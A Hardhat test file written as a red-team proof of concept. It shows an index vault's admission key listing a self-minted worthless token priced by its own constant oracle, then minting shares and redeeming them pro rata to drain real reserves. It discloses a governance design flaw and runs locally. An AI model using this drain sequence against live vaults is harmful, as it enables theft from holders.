import { expect } from "chai";
import { ethers } from "hardhat";
import { time, takeSnapshot, type SnapshotRestorer } from "@nomicfoundation/hardhat-network-helpers";

import {
  WAD,
  TIMELOCK,
  MIN_CHECKPOINT,
  deployOpenIndex,
  deployConstituent,
} from "./helpers/index-vault";

/**
 * RED TEAM PoC — ROLE_CONSTITUENT_ADMISSION IS A FULL-CUSTODY KEY, ONE
 * TIMELOCK AWAY.
 *
 * `IndexGovernanceFacet.queueListing` accepts an ARBITRARY `token` and an
 * ARBITRARY `IIndexPriceSource source`, with no validation at queue time and
 * none at execute time beyond `token != 0 / source != 0 / rawWeight <= BPS /
 * !listed / !stream / count < 32` (`IndexFacetBase._list`). Nothing checks that
 * the price source is independent of the token, or of the caller.
 *
 * So the admission key can list a token it minted itself, priced by an oracle
 * it wrote itself, and then mint index shares against the whole real basket
 * with `mintSingleAsset` — bounded only by the concentration cap — and walk out
 * through `redeemProRata`, the deliberately unblockable, price-free exit door.
 *
 * This contradicts `IndexGovernanceFacet`'s own header:
 *   "EVERY function here affects FUTURE parameter values only. None can move a
 *    constituent balance ... there is no code path anywhere in the finalized
 *    facet set that transfers a reserve to anyone except a share-burning
 *    redeemer."
 * Literally true. Materially false: the listing key MANUFACTURES the
 * share-burning redeemer.
 *
 * LOCAL HARDHAT ONLY.
 */
describe("RED TEAM — a hostile constituent admission drains the basket", () => {
  let snap: SnapshotRestorer;
  before(async () => {
    snap = await takeSnapshot();
  });
  after(async () => {
    await snap.restore();
  });

  it("PoC: the admission key lists a self-priced worthless token and redeems real reserves", async () => {
    const fx = await deployOpenIndex();
    const { vault, vaultAddr, admission, alice, tokens, addrs } = fx;

    // A real user is already in the basket.
    await vault.connect(alice).mintProRata(500n * WAD, [
      ethers.MaxUint256,
      ethers.MaxUint256,
      ethers.MaxUint256,
    ]);

    // ── The attack. The admission key is the ONLY key used. ────────────────
    // A worthless token, and a price source the attacker wrote, claiming 1 ETH
    // per unit. `MockIndexPriceSource` is exactly the interface the vault
    // accepts — there is no distinction on-chain between this and a real one.
    const fake = await deployConstituent("FAKE", 100n * WAD, 100n * WAD);
    await fake.token.mint(admission.address, 1_000_000n * WAD);
    await fake.token.connect(admission).approve(vaultAddr, ethers.MaxUint256);

    await vault
      .connect(admission)
      .queueListing(fake.addr, await fake.source.getAddress(), 3_000, false);
    await time.increase(TIMELOCK + 1);
    await vault.executeListing(fake.addr);

    // Warm the ring buffer so `_requirePersistenceIfLarge` is satisfied. The
    // attacker's source returns a CONSTANT price, so persistence holds
    // PERFECTLY — every retained observation equals the TWAP exactly.
    for (let i = 0; i < 8; i++) {
      await time.increase(MIN_CHECKPOINT + 1);
      await vault.checkpointAll();
    }
    expect(await vault.persistenceHolds(fake.addr)).to.equal(true);

    const realBefore = await Promise.all(
      tokens.map((t: any) => t.balanceOf(admission.address))
    );
    const reservesBefore = await Promise.all(addrs.map((a: string) => vault.reserveOf(a)));

    // Mint against the fake leg, right up to whatever the concentration cap
    // allows, then leave through the free pro-rata exit door.
    await vault.connect(admission).mintSingleAsset(fake.addr, 800n * WAD, 0n);
    const got: bigint = await vault.balanceOf(admission.address);
    expect(got).to.be.greaterThan(0n);

    await vault.connect(admission).redeemProRata(got, [0n, 0n, 0n, 0n]);

    const realAfter = await Promise.all(
      tokens.map((t: any) => t.balanceOf(admission.address))
    );

    // ── The damage, priced. ───────────────────────────────────────────────
    // Constituent prices in the fixture are 1.0 / 0.5 / 2.0 ETH.
    const px = [WAD, WAD / 2n, 2n * WAD];
    let stolenEth = 0n;
    for (let i = 0; i < 3; i++) {
      const gained = realAfter[i] - realBefore[i];
      expect(gained, `leg ${i} paid nothing`).to.be.greaterThan(0n);
      stolenEth += (gained * px[i]) / WAD;
      // ...and it came straight out of the reserve real holders own.
      expect(await vault.reserveOf(addrs[i])).to.be.lessThan(reservesBefore[i]);
    }

    console.log(
      "\n  admission key alone extracted ~" +
        ethers.formatEther(stolenEth) +
        " ETH of REAL constituent reserves, for a worthless token it minted itself"
    );
    expect(stolenEth).to.be.greaterThan(100n * WAD);
  });
});
